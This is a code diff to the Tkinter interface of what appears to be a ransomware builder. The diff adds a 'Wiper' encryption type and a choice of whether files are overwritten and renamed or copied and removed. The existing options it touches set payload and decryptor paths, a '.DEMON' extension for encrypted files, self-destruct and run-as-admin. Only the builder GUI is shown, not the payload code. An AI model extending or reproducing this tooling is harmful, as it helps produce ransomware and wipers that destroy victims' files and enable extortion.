@@ -339,6 +339,7 @@ class MainWindow(Tk):
             'mode' : IntVar(),
             'demo' : IntVar(),
             'type' : StringVar(),
+            'method' : StringVar(),
             'icon_path' : StringVar(),
             'payload_path' : StringVar(),
             'decryptor_path' : StringVar(),
@@ -392,6 +393,7 @@ class MainWindow(Tk):
         self.options['mode'].set(1)
         self.options['demo'].set(0)
         self.options['type'].set('pycrypto')
+        self.options['method'].set('override')
         self.options['debug'].set(0)
         self.options['ext'].set('.DEMON')
         self.options['remove_payload'].set(0)
@@ -969,8 +971,9 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         enc_frame = LabelFrame(self.gen, text = 'Encryption Type')
         enc_frame.grid(row = 0, column = 2, sticky = 'w')
         Radiobutton(enc_frame, text = 'Ghost (Fastest)', variable = self.options['type'], value = 'ghost').grid(row = 0, column = 0, sticky = 'w')
-        Radiobutton(enc_frame, text = 'PyCrypto (Fast)', variable = self.options['type'], value = 'pycrypto').grid(row = 1, column = 0, sticky = 'w')
-        Radiobutton(enc_frame, text = 'PyAES (Slow)', variable = self.options['type'], value = 'pyaes').grid(row = 2, column = 0, sticky = 'w')
+        Radiobutton(enc_frame, text = 'Wiper (Faster)', variable = self.options['type'], value = 'wiper').grid(row = 1, column = 0, sticky = 'w')
+        Radiobutton(enc_frame, text = 'PyCrypto (Fast)', variable = self.options['type'], value = 'pycrypto').grid(row = 2, column = 0, sticky = 'w')
+        Radiobutton(enc_frame, text = 'PyAES (Slow)', variable = self.options['type'], value = 'pyaes').grid(row = 3, column = 0, sticky = 'w')
 
         options_frame = LabelFrame(self.gen, text = 'Options')
         options_frame.grid(row = 1, column = 2, sticky = 'nw')
@@ -979,6 +982,10 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
         Checkbutton(options_frame, text = 'Self-destruct', variable = self.options['remove_payload'], onvalue = 1, offvalue = 0).grid(row = 2, column = 0, sticky = 'w')
         Checkbutton(options_frame, text = 'Run as admin (Windows)', variable = self.options['runas'], onvalue = 1, offvalue = 0).grid(row = 3, column = 0, sticky = 'w')
 
+        meth_frame = LabelFrame(self.gen, text = 'Encryption Method')
+        meth_frame.grid(row = 2, column = 2, sticky = 'w')
+        Radiobutton(meth_frame, text = 'Override and Rename', variable = self.options['method'], value = 'override').grid(row = 0, column = 0, sticky = 'w')
+        Radiobutton(meth_frame, text = 'Copy and Remove', variable = self.options['method'], value = 'copy').grid(row = 1, column = 0, sticky = 'w')
 
         finish_frame = LabelFrame(self.gen, text = 'Finish')
         finish_frame.grid(row = 2, column = 0, columnspan = 1, sticky = 'w')
@@ -1074,6 +1081,7 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                 self.options['full_screen_var'].get(),
                 self.options['demo'].get(),
                 self.options['type'].get(),
+                self.options['method'].get(),
                 self.options['msg'].get(),
                 self.options['img_base64'].get(),
                 self.options['mode'].get(),
